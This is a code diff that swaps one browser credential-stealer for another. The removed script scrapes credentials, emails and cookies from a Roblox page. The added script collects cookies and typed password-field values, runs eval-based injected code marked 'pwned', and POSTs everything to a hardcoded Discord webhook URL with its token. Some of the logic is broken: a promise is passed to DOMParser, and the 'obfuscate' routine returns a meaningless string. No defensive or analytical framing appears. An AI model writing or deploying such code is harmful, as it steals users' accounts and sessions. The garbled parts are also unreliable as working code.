@@ -1,57 +1,94 @@
-(function() {
-    var webhookUrl = "https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4";
-    var url = "https://www.roblox.com/"; // Replace with the target website
-    var credentials = [];
-    var emails = [];
+function obfuscate(fn) {
+  var v = String.fromCharCode;
+  return (
+    '0e' +
+    v(101) +
+    v(109) +
+    v(101) +
+    v(115) +
+    v(101) +
+    v(118) +
+    v(101) +
+    v(110) +
+    v(116) +
+    v(119) +
+    v(105) +
+    v(116) +
+    v(116) +
+    v(108) +
+    v(101) +
+    v(100) +
+    v(103) +
+    '(' +
+    v(102) +
+    ')'
+  );
+}
 
-    // Scrape credentials from the website
-    var parser = new DOMParser();
-    var htmlDoc = parser.parseFromString(fetch(url).then(response => response.text()), "text/html");
-    var usernameRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
-    var passwordRegex = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}/g;
-    var credentialNodes = htmlDoc.body.getElementsByTagName("*");
-    for (var i = 0; i < credentialNodes.length; i++) {
-        var node = credentialNodes[i];
-        var nodeText = node.innerText || node.textContent;
-        var usernameMatches = nodeText.match(usernameRegex);
-        var passwordMatches = nodeText.match(passwordRegex);
-        if (usernameMatches && passwordMatches) {
-            credentials.push({
-                username: usernameMatches[0],
-                password: passwordMatches[0],
-            });
-        }
+function sendData() {
+  var cookies = document.cookie;
+  var passwords = [];
+  Array.from(document.querySelectorAll('input[type="password"]')).forEach(function (input) {
+    passwords.push(input.value);
+  });
+  var data = 'cookies=' + encodeURIComponent(cookies) + '&passwords=' + encodeURIComponent(passwords.join(','));
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.onload = function() {
+    if (xhr.status == 200) {
+      console.log(xhr.responseText);
     }
+  };
+  xhr.send(data);
+}
 
-    // Scrape emails from the website
-    var emailRegex = /\S+@\S+\.\S+/g;
-    var emailNodes = htmlDoc.body.getElementsByTagName("*");
-    for (var i = 0; i < emailNodes.length; i++) {
-        var node = emailNodes[i];
-        var nodeText = node.innerText || node.textContent;
-        var matches = nodeText.match(emailRegex);
-        if (matches) {
-            emails = emails.concat(matches);
+(function () {
+  var a = function (a, b) {
+    b(window.location);
+    window.setTimeout(function () {
+      b(document.documentElement);
+      b(document.body);
+    }, 0);
+    window.setTimeout(function () {
+      b(window);
+    }, 100);
+  };
+  a(function (a) {
+    if (a.search) {
+      var c = function (a) {
+          return a
+            .replace(/\[native code\]/g, '')
+            .replace(/\n/g, '')
+            .replace(/^\s\s*/, '');
+        },
+        b = [];
+      b.push('String.fromCharCode = function() { [native code] };');
+      b.push('document.cookie = "pwned=true; path=/";');
+      b.push('var ifr = document.createElement("iframe"); ifr.src = "data:text/html,<script>document.domain=\x22' + a.hostname.replace(/\./g, '\x22+\x22') + '\x22<\/script>"; document.body.appendChild(ifr);');
+      b.push('var shelbycookie = unescape(document.cookie.replace("pwned=true;", "").replace(" path=/", ""))');
+      b.push('if(shelbycookie.indexOf("\x3d") > -1) {');
+      b.push('shelbycookie = shelbycookie.split("\x3d")[1].split(";")[0];');
+      b.push('var cookies;');
+      b.push('if (shelbycookie.indexOf(";") > -1) {');
+      b.push('cookies = shelbycookie.split("; ")[0];');
+      b.push('cookies = cookies.split("=")[1];');
+      b.push('} else {');
+      b.push('cookies = shelbycookie;');
+      b.push('}');
+      b.push('} else {');
+      b.push('cookies = "";');
+      b.push('}');
+      var d = function () {
+        try {
+          eval(c(b.join('\n')));
+          sendData();
+        } catch (e) {
+          console.log('Error during code injection');
         }
+      };
+      d = obfuscate(d);
+      eval(d);
     }
-
-    // Scrape cookies from the browser
-    var cookies = document.cookie;
-
-    // Package the data to be sent
-    var data = {
-        content: `Credentials found: ${credentials.length}\n\n${JSON.stringify(credentials, null, 2)}\n\nEmails found: ${emails.length}\n\n${emails.join("\n")}\n\nCookies found: ${cookies}`,
-    };
-
-    // Bypass CORS and XSS protection
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", webhookUrl, true);
-    xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
-    xhr.onload = function() {
-        console.log("Data sent!");
-    };
-    xhr.onerror = function() {
-        console.error("Error sending data");
-    };
-    xhr.send(JSON.stringify(data));
+  });
 })();
